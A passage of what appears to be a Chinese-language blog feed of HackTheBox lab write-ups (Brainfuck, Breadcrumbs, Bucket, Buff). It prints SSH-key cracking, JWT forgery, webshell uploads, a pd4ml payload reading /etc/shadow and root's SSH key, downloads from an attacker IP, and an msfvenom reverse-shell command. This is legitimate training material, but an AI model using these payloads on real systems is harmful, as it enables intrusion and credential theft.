<p><img src="/images/brainfuck/18.png" alt="18"></p>
<p>之后发现了一处加密的信息，疑似url</p>
<p><img src="/images/brainfuck/19.png" alt="19"></p>
<p>使用之前的密钥来解密这个url，可以在<a href="http://rumkin.com/tools/cipher/vigenere-keyed.php">链接</a>处快速解密</p>
<p><img src="/images/brainfuck/20.png" alt="20"></p>
<p>获得URL<code>https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa</code></p>
<p>下载<code>id_rsa</code>,还需要破解它</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:&#x2F;usr&#x2F;share&#x2F;john#python ssh2john.py &#x2F;root&#x2F;Desktop&#x2F;id_rsa &gt; &#x2F;root&#x2F;Desktop&#x2F;pass.txt</span><br><span class="line">root@kali:~&#x2F;Desktop#john pass.txt --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt </span><br></pre></td></tr></table></figure>

<p><img src="/images/brainfuck/14.jpg" alt="14"></p>
<p>得出密钥:<code>3poulakia!</code>，之后就可以进行ssh连接获取shell</p>
<p><img src="/images/brainfuck/15.jpg" alt="15"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>在家目录发现了奇怪的python脚本</p>
<p><img src="/images/brainfuck/21.png" alt="21"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nbits &#x3D; 1024</span><br><span class="line"></span><br><span class="line">password &#x3D; open(&quot;&#x2F;root&#x2F;root.txt&quot;).read().strip()</span><br><span class="line">enc_pass &#x3D; open(&quot;output.txt&quot;,&quot;w&quot;)</span><br><span class="line">debug &#x3D; open(&quot;debug.txt&quot;,&quot;w&quot;)</span><br><span class="line">m &#x3D; Integer(int(password.encode(&#39;hex&#39;),16))</span><br><span class="line"></span><br><span class="line">p &#x3D; random_prime(2^floor(nbits&#x2F;2)-1, lbound&#x3D;2^floor(nbits&#x2F;2-1), proof&#x3D;False)</span><br><span class="line">q &#x3D; random_prime(2^floor(nbits&#x2F;2)-1, lbound&#x3D;2^floor(nbits&#x2F;2-1), proof&#x3D;False)</span><br><span class="line">n &#x3D; p*q</span><br><span class="line">phi &#x3D; (p-1)*(q-1)</span><br><span class="line">e &#x3D; ZZ.random_element(phi)</span><br><span class="line">while gcd(e, phi) !&#x3D; 1:</span><br><span class="line">    e &#x3D; ZZ.random_element(phi)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c &#x3D; pow(m, e, n)</span><br><span class="line">enc_pass.write(&#39;Encrypted Password: &#39;+str(c)+&#39;\n&#39;)</span><br><span class="line">debug.write(str(p)+&#39;\n&#39;)</span><br><span class="line">debug.write(str(q)+&#39;\n&#39;)</span><br><span class="line">debug.write(str(e)+&#39;\n&#39;)</span><br></pre></td></tr></table></figure>

<p>所以我们已经有了p和q，那是RSA的私钥，我们应该可以对其进行破解。找到了一个好用的脚本:<a href="https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e">链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def egcd(a, b):</span><br><span class="line">    x,y, u,v &#x3D; 0,1, 1,0</span><br><span class="line">    while a !&#x3D; 0:</span><br><span class="line">        q, r &#x3D; b&#x2F;&#x2F;a, b%a</span><br><span class="line">        m, n &#x3D; x-u*q, y-v*q</span><br><span class="line">        b,a, x,y, u,v &#x3D; a,r, u,v, m,n</span><br><span class="line">        gcd &#x3D; b</span><br><span class="line">    return gcd, x, y</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    p &#x3D; 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307</span><br><span class="line">    q &#x3D; 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079</span><br><span class="line">    e &#x3D; 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997</span><br><span class="line">    ct &#x3D; 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182</span><br><span class="line"></span><br><span class="line">    # compute n</span><br><span class="line">    n &#x3D; p * q</span><br><span class="line"></span><br><span class="line">    # Compute phi(n)</span><br><span class="line">    phi &#x3D; (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line">    # Compute modular inverse of e</span><br><span class="line">    gcd, a, b &#x3D; egcd(e, phi)</span><br><span class="line">    d &#x3D; a</span><br><span class="line"></span><br><span class="line">    print( &quot;n:  &quot; + str(d) );</span><br><span class="line"></span><br><span class="line">    # Decrypt ciphertext</span><br><span class="line">    pt &#x3D; pow(ct, d, n)</span><br><span class="line">    print( &quot;pt: &quot; + str(pt) )</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>得到输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977</span><br><span class="line">pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750</span><br></pre></td></tr></table></figure>

<p>pt就是解密后的明文了，再对照着源码dec转hex转ascii，应该就可以得到真正的明文了，也就是flag了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"></span><br><span class="line">pt &#x3D; 24604052029401386049980296953784287079059245867880966944246662849341507003750</span><br><span class="line">hexstr&#x3D;hex(pt)[2:]  #去除0x</span><br><span class="line">print(bytes.fromhex(hexstr).decode(&#39;utf-8&#39;))</span><br></pre></td></tr></table></figure>

<p><img src="/images/brainfuck/22.png" alt="22"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Breadcrumbs</title>
    <url>/2021/02/23/HTB-Breadcrumbs/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Breadcrumbs/1.png" alt="1"></p>
<p>这是一台windows机器，但是却安装了OpenSSH<br>高端口5040和7680搜索了一圈似乎可能是某些老旧的服务，但好像没有什么有效的攻击手段<br>SMB不允许匿名<br>从HTTP和HTTPS开始入手</p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>页面枚举</p>
<p><img src="/images/Breadcrumbs/6.png" alt="6"></p>
<p>发现了疑似后台</p>
<p><img src="/images/Breadcrumbs/7.png" alt="7"></p>
<p>http首页非常简单，提供了一个搜索书籍的功能</p>
<p><img src="/images/Breadcrumbs/3.png" alt="3"></p>
<p>*这里有个中国特色坑，页面有个js我移动网络打不开，导致我页面有些功能缺失了，反正hackthebox常见问题，习惯了。。</p>
<p><img src="/images/Breadcrumbs/2.png" alt="2"></p>
<p>页面包含了两个请求，一个是查询书的请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title&#x3D;a&amp;author&#x3D;&amp;method&#x3D;0</span><br></pre></td></tr></table></figure>

<p>考虑到3306 MariaDB的存在，尝试SQL注入，但并没成功</p>
<p>另一个是对书籍的收藏请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">book&#x3D;book9.html&amp;method&#x3D;1</span><br></pre></td></tr></table></figure>

<p>这个比较有意思，随便尝试几下，发现存在LFI</p>
<p><img src="/images/Breadcrumbs/4.png" alt="4"></p>
<p>当我尝试触发错误后，确认这里文件包含的函数是file_get_contents</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_get_contents(&#39;..&#x2F;books&#x2F;EvilInput&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breadcrumbs/5.png" alt="5"></p>
<p>发现了数据连接凭据<code>bzread/jUli901</code></p>
<p><img src="/images/Breadcrumbs/8.png" alt="8"></p>
<p>之后我尝试读取login.php，希望发现登录逻辑</p>
<p><img src="/images/Breadcrumbs/9.png" alt="9"></p>
<p>继续追踪 </p>
<p><img src="/images/Breadcrumbs/10.png" alt="10"></p>
<p>这一块需要代码审计了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat test.txt | sed &#39;s&#x2F;\\r\\n&#x2F;&#x2F;g&#39;</span><br></pre></td></tr></table></figure>

<p>把代码整理干净后，卡了一会儿了，不过由于LFI的存在，我决定枚举更多子目录，发现了目录遍历漏洞，配合LFI简直无敌</p>
<p><img src="/images/Breadcrumbs/11.png" alt="11"></p>
<p>发现了疑似用户名列表</p>
<p><img src="/images/Breadcrumbs/12.png" alt="12"></p>
<p>之后在代码审计的过程中，发现了关键词JWT，这是一种token认证的技术，幸好我有个做前端的兄弟跟我说过，巧了</p>
<p>我先注册了账号，凭据为<code>evil/evil</code></p>
<p><img src="/images/Breadcrumbs/13.png" alt="13"></p>
<p>确定看来需要通过审计，来进行未授权访问</p>
<p>首先寻找想要伪造的用户，之前已经得到了一个用户列表，可以尝试里面的用户，不过我发现了硬编码。</p>
<p>在<code>portal\includes\fileController.php</code>里，发现了JWT的密钥和疑似管理员用户paul</p>
<p><img src="/images/Breadcrumbs/15.png" alt="15"></p>
<p>接着在portal\cookie.php里发现了cookie的生成方式</p>
<p><img src="/images/Breadcrumbs/16.png" alt="16"></p>
<p>上面的代码，seed是个随机数，<code>$username[$seed]</code>是paul任意一个字母，所以一共有4种cookie</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">paula2a6a014d3bee04d7df8d5837d62e8c5</span><br><span class="line">paul61ff9d4aaefe6bdf45681678ba89ff9d</span><br><span class="line">paul8c8808867b53c49777fe5559164708c3</span><br><span class="line">paul47200b180ccd6835d25d034eeb6e6390</span><br></pre></td></tr></table></figure>

<p>接着网站分析了以下token，<a href="https://jwt.io/">https://jwt.io/</a></p>
<p><img src="/images/Breadcrumbs/14.png" alt="14"></p>
<p>既然知道了secret_key，那接下来就很简单了，Header部分不需要修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br></pre></td></tr></table></figure>

<p>Payload部分修改用户名，直接在网站上改就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ</span><br></pre></td></tr></table></figure>

<p>Signature部分输入密钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU</span><br></pre></td></tr></table></figure>

<p>反正网站非常方便 </p>
<p><img src="/images/Breadcrumbs/17.png" alt="17"></p>
<p>其实前两段就是base64，后面是<code>HMACSHA256(base64UrlEncode(header) + &#39;.&#39; + base64UrlEncode(payload), &#39;secret_key&#39;)</code></p>
<p><img src="/images/Breadcrumbs/18.png" alt="18"></p>
<p>所以cookie和jwttoken分别是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU</span><br></pre></td></tr></table></figure>

<p>替换之后，我成功登录</p>
<p><img src="/images/Breadcrumbs/19.png" alt="19"></p>
<p>后台有上传点，不过似乎只接受zip文件上传</p>
<p><img src="/images/Breadcrumbs/20.png" alt="20"></p>
<p>可以直接被绕过</p>
<p><img src="/images/Breadcrumbs/21.png" alt="21"></p>
<p>之后连webshell就行了</p>
<p><img src="/images/Breadcrumbs/22.png" alt="22"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>json文件里找到凭据</p>
<p><img src="/images/Breadcrumbs/23.png" alt="23"></p>
<p>ssh过去即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh juliette@10.10.10.228</span><br><span class="line">jUli901.&#x2F;())!</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breadcrumbs/24.png" alt="24"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Bucket</title>
    <url>/2021/04/27/HTB-Bucket/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Bucket/1.png" alt="1"></p>
<p>添加hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.212    bucket.htb</span><br></pre></td></tr></table></figure>

<p>在80端口有几个图片没有正常显示，查看后发现主机名，添加到hosts里</p>
<p><img src="/images/Bucket/2.png" alt="2"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.212    bucket.htb s3.bucket.htb</span><br></pre></td></tr></table></figure>

<p>之后图片可以加载，但没有有用的信息。尝试访问s3这个子域</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$curl http:&#x2F;&#x2F;s3.bucket.htb&#x2F; --head                                                                                               </span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 404 </span><br><span class="line">Date: Tue, 27 Apr 2021 05:18:03 GMT</span><br><span class="line">Server: hypercorn-h11</span><br><span class="line">content-type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">content-length: 21</span><br><span class="line">access-control-allow-origin: *</span><br><span class="line">access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH</span><br><span class="line">access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging</span><br><span class="line">access-control-expose-headers: x-amz-version-id</span><br></pre></td></tr></table></figure>

<p>发现了AWS相关的响应头，谷歌之后的得到关键信息，S3(Simple Storage Service)<br>官方文档:<a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html">链接</a></p>
<p>阅读之后可以得知，Bucket就是S3的容器，而HackTheBox能搭建这个环境是使用了<a href="https://github.com/localstack/localstack">localstack</a></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>要与S3进行交互，需要安装aws cli</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install awscli</span><br></pre></td></tr></table></figure>

<p>之后使用它需要花费一些时间阅读文档</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">简单介绍	https:&#x2F;&#x2F;docs.aws.amazon.com&#x2F;zh_cn&#x2F;cli&#x2F;latest&#x2F;userguide&#x2F;cli-chap-welcome.html</span><br><span class="line">命令参数	https:&#x2F;&#x2F;docs.aws.amazon.com&#x2F;cli&#x2F;latest&#x2F;reference&#x2F;index.html</span><br><span class="line">S3参数	 https:&#x2F;&#x2F;docs.aws.amazon.com&#x2F;cli&#x2F;latest&#x2F;reference&#x2F;s3&#x2F;index.html</span><br></pre></td></tr></table></figure>

<p>这个工具默认与URL<code>s3.amazonaws.com</code>进行交互，所以我们需要指定目标url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aws --endpoint-url&#x3D;http:&#x2F;&#x2F;s3.bucket.htb s3 ls</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bucket/3.png" alt="3"></p>
<p>aws去寻找<code>~/.aws/credentials</code>文件，但没找到，所以我们需要手动设置key</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aws configure</span><br></pre></td></tr></table></figure>

<p>这里的凭据可以随意设置，localstack好像不会验证</p>
<p><img src="/images/Bucket/4.png" alt="4"></p>
<p>发现了一个叫做adserver的bucket，查看这个bucket里面的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aws --endpoint-url&#x3D;http:&#x2F;&#x2F;s3.bucket.htb s3 ls adserver</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bucket/5.png" alt="5"></p>
<p>看起来像个web目录，尝试上传php shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aws --endpoint-url&#x3D;http:&#x2F;&#x2F;s3.bucket.htb s3 cp webshell.php s3:&#x2F;&#x2F;adserver&#x2F;webshell.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bucket/6.png" alt="6"></p>
<p>之后访问就能获得shell</p>
<p><img src="/images/Bucket/7.png" alt="7"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>找到AWS创建凭据的文件，读取需要root</p>
<p><img src="/images/Bucket/8.png" alt="8"></p>
<p>之后枚举本地开放端口</p>
<p><img src="/images/Bucket/9.png" alt="9"></p>
<p>在apache的配置文件发现，<code>mpm_itk_module</code>以root身份监听8000端口，并且web目录位于<code>/var/www/bucket-app</code></p>
<p><img src="/images/Bucket/10.png" alt="10"></p>
<p>而且80端口反向代理到了4566端口，从网卡可以猜测，4566运行着docker，让面跑着localstack</p>
<p><img src="/images/Bucket/11.png" alt="11"></p>
<p>查看web目录，发现了<code>bucket-app</code>目录</p>
<p><img src="/images/Bucket/12.png" alt="12"></p>
<p>发现被设置了ACL，使用<code>getfacl</code>进行查看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getfacl bucket-app</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bucket/13.png" alt="13"></p>
<p>可以发现，用户roy可以进行读取，可以先记下</p>
<h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>由于aws，所以对dynamodb进行枚举(dynamodb枚举可以参考<a href="https://docs.aws.amazon.com/cli/latest/reference/dynamodb/index.html">链接</a>)</p>
<p>查看表名，得到users</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aws --endpoint-url&#x3D;http:&#x2F;&#x2F;s3.bucket.htb dynamodb list-tables</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bucket/14.png" alt="14"></p>
<p>对users表进行扫描，得到凭据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aws --endpoint-url&#x3D;http:&#x2F;&#x2F;s3.bucket.htb dynamodb scan --table-name users</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bucket/15.png" alt="15"></p>
<p>使用linux的jq工具，对json数据进行处理，提取凭据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aws --endpoint-url&#x3D;http:&#x2F;&#x2F;s3.bucket.htb dynamodb scan --table-name users |jq -r &#39;.Items[] | &quot;\(.username[]):\(.password[])&quot;&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bucket/16.png" alt="16"></p>
<p>我们有了凭据，使用它们对这台机器的上用户进行SSH连接，最后得到<code>roy/n2vM-&lt;_K_Q:.Aa2</code></p>
<p><img src="/images/Bucket/17.png" alt="17"></p>
<p>所以webshell看来这里不是必备的，关键是对dynamodb的枚举</p>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>也是对dynamodb枚举来寻找凭据，不同之处在于，这里使用Javascript</p>
<p>之前对目录枚举发现了shell，尝试访问</p>
<p><img src="/images/Bucket/18.png" alt="18"></p>
<p>这里有点坑，访问<code>/shell</code>会重定向到另一个主机名和另一个端口，这里我们是无法访问的，不过这里可以通过访问<code>/shell/</code>来解决</p>
<p>这里提供了javascript shell，如何使用参考<a href="https://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/DynamoDB.html">链接</a></p>
<p><img src="/images/Bucket/19.png" alt="19"></p>
<p>枚举列表</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> params = &#123;</span><br><span class="line">&#125;;</span><br><span class="line">dynamodb.listTables(params, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (err) <span class="built_in">console</span>.log(err, err.stack); <span class="comment">// an error occurred</span></span><br><span class="line">  <span class="keyword">else</span>     <span class="built_in">console</span>.log(data);           <span class="comment">// successful response</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  data = &#123;</span></span><br><span class="line"><span class="comment">   TableNames: [</span></span><br><span class="line"><span class="comment">      &quot;Forum&quot;, </span></span><br><span class="line"><span class="comment">      &quot;ProductCatalog&quot;, </span></span><br><span class="line"><span class="comment">      &quot;Reply&quot;, </span></span><br><span class="line"><span class="comment">      &quot;Thread&quot;</span></span><br><span class="line"><span class="comment">   ]</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bucket/20.png" alt="20"></p>
<p>枚举数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> var params &#x3D; &#123;</span><br><span class="line">  TableName: &quot;users&quot;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line">dynamodb.scan(params, function(err, data) &#123;</span><br><span class="line">  if (err) console.log(err, err.stack); &#x2F;&#x2F; an error occurred</span><br><span class="line">  else     console.log(data);           &#x2F;&#x2F; successful response</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bucket/21.png" alt="21"></p>
<p>所以也能获得密码</p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>我们已经知道了root运行着apache服务，所以直接先转发端口到本地，这里我选择本地的9001端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -L 9001:127.0.0.1:8000 roy@bucket.htb</span><br></pre></td></tr></table></figure>

<p>暂时没有太多的发现</p>
<p><img src="/images/Bucket/22.png" alt="22"></p>
<p>不过可以去查看之前root web目录下的文件</p>
<p><img src="/images/Bucket/23.png" alt="23"></p>
<p>分析可以发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">发送一个特殊的post请求，目标连接DynamoDB</span><br><span class="line">扫描alerts表，根据标题，找到标题为Ransomware，之后将其中的数据生成一个随即名的html文件，在files目录里</span><br><span class="line">之后执行系统命令，使用PD4ML讲html文件转换成PDF文件，也是保存在files目录里</span><br></pre></td></tr></table></figure>

<p>所以我们要通过aws DynamoDB 来创建一个特殊的表，参考<a href="https://docs.aws.amazon.com/cli/latest/reference/dynamodb/create-table.html#examples">链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aws --endpoint-url&#x3D;http:&#x2F;&#x2F;localhost:4566 dynamodb create-table \</span><br><span class="line">    --table-name alerts \</span><br><span class="line">    --attribute-definitions AttributeName&#x3D;title,AttributeType&#x3D;S \</span><br><span class="line">    --key-schema AttributeName&#x3D;title,KeyType&#x3D;HASH \</span><br><span class="line">    --provisioned-throughput ReadCapacityUnits&#x3D;5,WriteCapacityUnits&#x3D;5</span><br></pre></td></tr></table></figure>

<p>查看创建成功</p>
<p><img src="/images/Bucket/25.png" alt="25"></p>
<p>之后要往里写入合规的json数据，在此之前查看pd4ml的使用方法，<a href="https://pd4ml.com/cookbook/pdf-attachments.htm">链接</a><br>可以发现，它可以引入外部链接，这可能可以造成文件读取</p>
<p>编辑evil.json文件</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;title&quot;</span>:</span><br><span class="line">    &#123;<span class="attr">&quot;S&quot;</span>: <span class="string">&quot;Ransomware&quot;</span>&#125;,</span><br><span class="line">    <span class="attr">&quot;data&quot;</span> :</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;S&quot;</span>:<span class="string">&quot;&lt;html&gt;&lt;pd4ml:attachment src=&#x27;file:///etc/shadow&#x27; description=&#x27;sample test&#x27; icon=&#x27;Paperclip&#x27;/&gt;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>向alerts表里插入data</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aws --endpoint-url&#x3D;http:&#x2F;&#x2F;localhost:4566 dynamodb put-item --table-name alerts --item file:&#x2F;&#x2F;evil.json</span><br></pre></td></tr></table></figure>

<p>最后发送post请求，让这个过程开始即可(这里是在kali上操作的)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X POST -d &quot;action&#x3D;get_alerts&quot; http:&#x2F;&#x2F;127.0.0.1:9001&#x2F;index.php</span><br></pre></td></tr></table></figure>

<p>之后就可以发现web目录多出了files目录，里面存放生成的pdf和html文件</p>
<p><img src="/images/Bucket/27.png" alt="27"></p>
<p>在kali上访问生成的pdf，成功利用链接读取到了shadow文件</p>
<p><img src="/images/Bucket/28.png" alt="28"></p>
<p>现在，只需要读取id_rsa即可，另外这里pd4ml使用的是java，所以我们可以只传递目录参数，这会列出目录下的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;title&quot;:</span><br><span class="line">    &#123;&quot;S&quot;: &quot;Ransomware&quot;&#125;,</span><br><span class="line">    &quot;data&quot; :</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;S&quot;:&quot;&lt;html&gt;&lt;pd4ml:attachment src&#x3D;&#39;file:&#x2F;&#x2F;&#x2F;root&#x2F;.ssh&#x2F;id_rsa&#39; description&#x3D;&#39;sample test&#39; icon&#x3D;&#39;Paperclip&#39;&#x2F;&gt;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bucket/29.png" alt="29"></p>
<p>ssh过去</p>
<p><img src="/images/Bucket/30.png" alt="30"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Buff</title>
    <url>/2020/10/23/HTB-Buff/</url>
    <content><![CDATA[<h1 id="Buff"><a href="#Buff" class="headerlink" title="Buff"></a>Buff</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Buff/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>发现CMS <code>Gym Management</code></p>
<p><img src="/images/Buff/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>搜索公开漏洞</p>
<p><img src="/images/Buff/3.png" alt="3"></p>
<p>运行exp</p>
<p><img src="/images/Buff/4.png" alt="4"></p>
<p>看样子是个webshell，查看它的源码，果然是这样</p>
<p><img src="/images/Buff/5.png" alt="5"></p>
<p>通过<code>powershell wget</code>进行文件传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell wget &quot;http:&#x2F;&#x2F;10.10.16.2&#x2F;winpriv&#x2F;plink32.exe&quot; -outfile &quot;plink.exe&quot;</span><br></pre></td></tr></table></figure>

<p>这台机器有些奇怪的地方</p>
<p>certutil貌似无法使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;10.10.16.2&#x2F;nc.exe</span><br><span class="line">Access is denied.</span><br></pre></td></tr></table></figure>

<p>msfvenom的shell运行会被删除，疑似AV？</p>
<p>机器是64位的，webshell应该也是64位的</p>
<p><img src="/images/Buff/8.png" alt="8"></p>
<p>但好像只能用32位的nc获得shell</p>
<p><img src="/images/Buff/6.png" alt="6"></p>
<p>不知道为什么</p>
<p><img src="/images/Buff/7.png" alt="7"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>说实话，有点蛋疼，首先我成功运行了<code>winpeas86</code>，但没有发现有意思的东西</p>
<p>检查端口</p>
<p><img src="/images/Buff/9.png" alt="9"></p>
<p>第一眼看过去好像没什么啥发现</p>
<p>检查user的目录</p>
<p><img src="/images/Buff/10.png" alt="10"></p>
<p>发现了<code>CloudMe_1112.exe</code>，接着我又去枚举进程</p>
<p><img src="/images/Buff/11.png" alt="11"></p>
<p>发现了它确实在运行</p>
<p>搜索公开漏洞，发现了48389.py</p>
<p><img src="/images/Buff/12.png" alt="12"></p>
<p>有点犹豫，因为它似乎运行在8888端口，而我并没有发现它</p>
<p>我是用nc来探测该端口是否处于开放</p>
<p><img src="/images/Buff/16.png" alt="16"></p>
<p>却又发现它确实开放，这次netstat可以显示8888端口，不知道原因</p>
<p>先进行端口转发，这里需要绕过一下，22端口似乎无法使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plink.exe -l root -pw toor -P 53 10.10.16.2 -R 8888:127.0.0.1:8888</span><br></pre></td></tr></table></figure>

<p><img src="/images/Buff/13.png" alt="13"></p>
<p>这是一个BOF漏洞，需要生成一下shellcode，考虑防病毒也许存在，使用之前成功的nc获取shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;exec CMD&#x3D;&#39;C:\xampp\htdocs\gym\upload\nc.exe 10.10.16.2 443 -e cmd&#39; -b &#39;\x00\x0a\x0d&#39; -f python -v payload</span><br></pre></td></tr></table></figure>

